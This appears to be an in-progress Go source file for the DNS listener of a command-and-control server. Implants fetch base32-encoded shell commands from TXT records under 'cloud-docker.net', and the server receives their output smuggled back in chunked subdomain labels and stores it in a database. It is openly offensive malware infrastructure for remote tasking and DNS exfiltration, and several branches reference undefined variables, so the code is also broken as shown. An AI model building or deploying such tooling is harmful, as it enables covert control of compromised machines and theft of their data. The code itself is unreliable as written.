package main

import (
	"encoding/base32"
	"flag"
	"fmt"
	"github.com/miekg/dns"
	"gorm.io/gorm"
	"log"
	"net"
	"strconv"
	"strings"
	"sync"
)

/*
	TODO: have different endpoints for hiding (not cmd, res) (maybe c, r)? + add /new endpoint, obv
		- command format: `<implant-id>.cmd.cloud-docker.net`
		- sending results format: `implantID.taskID.totalChunkCount.chunkIndex.chunkData.res.<domain>`
*/

// systemd-resolved on VM
// TODO: what is it marking tasks as after sending them in HTTPS-listener?
// TODO: move to constants area? -> how to handle all these flag values
var domain = flag.String("domain", "cloud-docker.net", "DNS zone")

// TODO:  LOOK THROUGH the cmd + res logic for dns implant + server, make sure everything matches up as its how its sending stuff
type DNSListener struct {
	db *gorm.DB
}

// partialResult holds incoming chunks until all are received
type partialResult struct {
	totalChunks int
	chunks      map[int][]byte // chunkIndex -> data
}

type DNSHandler struct {
	db      *gorm.DB
	encoder *base32.Encoding // Base32 no-padding encoder
	decoder *base32.Encoding // Base32 no-padding decoder
	mu      sync.Mutex
	pending map[string]map[uint]*partialResult // pending results: implantID -> taskID -> partialResult
}

func NewDNSHandler(db *gorm.DB) *DNSHandler {
	return &DNSHandler{
		db:      db,
		encoder: base32.StdEncoding.WithPadding(base32.NoPadding),
		decoder: base32.StdEncoding.WithPadding(base32.NoPadding),
		pending: make(map[string]map[uint]*partialResult),
	}
}

// getPendingTasks gets all incomplete tasks for the given implant
func getPendingTasksForImplant(db *gorm.DB, implantID uint) ([]Task, error) {
	var tasks []Task
	err := db.
		Find(&tasks, "implant_id = ? AND completed = ?", implantID, false).
		Error
	return tasks, err
}

// storeNewResult #TODO: write description
func storeNewResult(db *gorm.DB, implantID uint, res Result) error {
	return db.Transaction(func(tx *gorm.DB) error {
		// 1. find the corresponding Task
		var task Task
		if err := tx.
			Where("id = ? AND implant_id = ?", res.TaskID, implantID).
			First(&task).Error; err != nil {
			return err
		}

		if err := tx.Create(&res).Error; err != nil {
			return err
		}

		if err := tx.
			Model(&task).
			Update("completed", true).
			Error; err != nil {
			return err
		}

		return nil
	})
}

// TODO: break into seperate functions? -> to big rn
func (h *DNSHandler) ServeDNS(w dns.ResponseWriter, req *dns.Msg) {
	q := req.Question[0]
	log.Printf("Raw Query %s\n", q.Name)
	normalizedQName := strings.ToLower(q.Name) // add a comment here
	labels := dns.SplitDomainName(normalizedQName)
	implantID := labels[0]
	u64ImplantID, err := strconv.ParseUint(implantID, 10, 0)
	if err != nil {
		// TODO: std err
	}
	// TODO: add some sort of check here that checks for len(labels) to be the minimum length, if not return ?
	reply := new(dns.Msg)
	reply.SetReply(req)
	reply.Authoritative = true

	switch q.Qtype {
	case dns.TypeTXT:
		// TOOD: do the uppercase/lowercase switch differently for the base32 encoding, then ask chat if this is best way to do it
		if labels[1] == "cmd" { // implant is requesting command
			// TODO: we should base32encode sent command as well

			pendingTasks, err := getPendingTasksForImplant(h.db, uint(u64ImplantID))
			if err != nil {
				// TODO: std error
			}

			pendingCommands := make(map[uint]string, 0) // task ID: task Command
			for _, task := range pendingTasks {
				if task.Type != ShellCommand { // throw error? only Command tasks work for DNS
					continue
				}

				commandWithArgs, ok := task.Options["commandWithArgs"].([]string)
				if !ok {
					continue // TODO: handle error
				}

				pendingCommands[task.ID] = strings.Join(commandWithArgs, " ")
			}
			if len(pendingCommands) == 0 {
				reply.Answer = []dns.RR{emptyTXT(q.Name)}
			} else {
				for taskID, cmd := range pendingCommands {
					payload := fmt.Sprintf("%d:%s", taskID, cmd)
					encoded := h.encoder.EncodeToString([]byte(payload))
					reply.Answer = append(reply.Answer, makeTXT(q.Name, encoded))
				}
			}
		} else if labels[5] == "res" { // implant is sending result of running command
			// - sending results format: `implantID.taskID.totalChunkCount.chunkIndex.chunkData.res.<domain>`

			// TODO: need all this?
			taskID, err1 := strconv.ParseUint(labels[1], 10, 64)
			totalChunks, err2 := strconv.Atoi(labels[2])
			chunkIndex, err3 := strconv.Atoi(labels[3])

			if err1 != nil || err2 != nil || err3 != nil {
				log.Printf("Invalid result labels: %v, %v, %v", err1, err2, err3)
				reply.Answer = []dns.RR{emptyTXT(q.Name)}
				break
			}
			chunkData := strings.ToUpper(labels[4])
			data, err := h.decoder.DecodeString(chunkData)
			if err != nil {
				log.Printf("Error decoding chunk data: %v", err)
				reply.Answer = []dns.RR{emptyTXT(q.Name)}
				break
			}
			// buffer chunk
			tID := uint(taskID)
			if totalChunks == 1 {
				// TODO: make it so don't repeat this -> could move creating Result to storeNewResult, that would make way more sense
				newResult := Result{
					Content: string(data),
					// TODO: shoudl add Success  -> send as another subdomain field
					TaskID: tID,
				}
				if err := storeNewResult(h.db, uint(u64ImplantID), newResult); err != nil {
					log.Printf("Error storing single-chunk result: %v", err)
				}
				reply.Answer = []dns.RR{emptyTXT(q.Name)}
				break
			}

			h.mu.Lock()
			if _, ok := h.pending[implantID]; !ok {
				h.pending[implantID] = make(map[uint]*partialResult)
			}
			// partialResult
			pr, exists := h.pending[implantID][tID]
			if !exists { // TODO: should not
				pr = &partialResult{totalChunks: totalChunks, chunks: make(map[int][]byte)}
				h.pending[implantID][tID] = pr
			}
			pr.chunks[chunkIndex] = data
			complete := len(pr.chunks) == pr.totalChunks
			if complete {
				// assmeble
				assembled := make([]byte, 0)
				for i := 1; i <= pr.totalChunks; i++ {
					assembled = append(assembled, pr.chunks[i]...)
				}
				// cleanup buffer
				delete(h.pending[implantID], tID)
				h.mu.Unlock()
				// store in DB
				newResult := Result{
					Content: string(assembled),
					// TODO: shoudl add Success  -> send as another subdomain field
					TaskID: tID,
				}
				if err := storeNewResult(h.db, uint(u64ImplantID), newResult); err != nil {
					log.Printf("Error storing full result: %v", err)
				}
			} else {
				h.mu.Unlock()
			}
			reply.Answer = []dns.RR{emptyTXT(q.Name)}
		} else {
			reply.Answer = []dns.RR{emptyTXT(q.Name)}
		}
	case dns.TypeSOA:
		if q.Name == fqdnDomain {
			m.Answer = append(m.Answer, &dns.SOA{
				Hdr:     dns.RR_Header{Name: fqdnDomain, Rrtype: dns.TypeSOA, Class: dns.ClassINET, Ttl: 60},
				Ns:      ns1Name,
				Mbox:    "hostmaster." + fqdnDomain,
				Serial:  serial,
				Refresh: 3600, Retry: 1800, Expire: 604800, Minttl: 60,
			})
		}

	// NS
	case dns.TypeNS:
		if q.Name == fqdnDomain {
			m.Answer = append(m.Answer,
				&dns.NS{Hdr: dns.RR_Header{Name: fqdnDomain, Rrtype: dns.TypeNS, Class: dns.ClassINET, Ttl: 60}, Ns: ns1Name},
				&dns.NS{Hdr: dns.RR_Header{Name: fqdnDomain, Rrtype: dns.TypeNS, Class: dns.ClassINET, Ttl: 60}, Ns: ns2Name},
			)
		}

	// A for your nameservers
	case dns.TypeA:
		switch q.Name {
		case ns1Name:
			m.Answer = append(m.Answer, &dns.A{
				Hdr: dns.RR_Header{Name: ns1Name, Rrtype: dns.TypeA, Class: dns.ClassINET, Ttl: 60},
				A:   net.ParseIP("<YOUR_STATIC_IP>"),
			})
		case ns2Name:
			m.Answer = append(m.Answer, &dns.A{
				Hdr: dns.RR_Header{Name: ns2Name, Rrtype: dns.TypeA, Class: dns.ClassINET, Ttl: 60},
				A:   net.ParseIP("<YOUR_STATIC_IP>"),
			})
		}
	default:
		reply.Answer = []dns.RR{emptyTXT(q.Name)} // TODO: would this wokr?
	}

	if err := w.WriteMsg(reply); err != nil {
		log.Printf("WriteMsg error: %v", err)
	}
}

func (listener *DNSListener) listen() {
	server := &dns.Server{
		Addr:    ":53",
		Net:     "udp",
		Handler: NewDNSHandler(listener.db)}
	log.Printf("Starting DNS server for zone %s on port 53", *domain)
	if err := server.ListenAndServe(); err != nil {
		log.Fatalf("server failed: %v", err)
	}
}

// helper for empty TXT
func emptyTXT(name string) dns.RR {
	return &dns.TXT{
		Hdr: dns.RR_Header{Name: dns.Fqdn(name), Rrtype: dns.TypeTXT, Class: dns.ClassINET, Ttl: 5},
		Txt: []string{""},
	}
}

// helper to create TXT with data
func makeTXT(name, txt string) dns.RR {
	return &dns.TXT{
		Hdr: dns.RR_Header{Name: dns.Fqdn(name), Rrtype: dns.TypeTXT, Class: dns.ClassINET, Ttl: 5},
		Txt: []string{txt},
	}
}
